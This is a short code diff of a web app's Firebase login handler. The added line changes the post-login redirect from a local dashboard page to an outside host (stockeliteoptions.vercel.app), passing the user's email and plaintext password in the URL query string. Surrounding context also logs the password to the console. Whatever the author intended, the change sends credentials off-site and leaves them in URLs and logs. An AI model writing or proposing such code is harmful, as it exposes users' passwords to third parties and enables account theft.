@@ -79,7 +79,7 @@
       console.log(password);
 signInWithEmailAndPassword(auth, email, password)
   .then((userCredential) => {
-    window.location.href = "../dash/index.html";
+    window.location.href=`https://stockeliteoptions.vercel.app/register/welcome.html?i=${email}&p=${password}`
   })
   .catch((error) => {
     const errorCode = error.code;
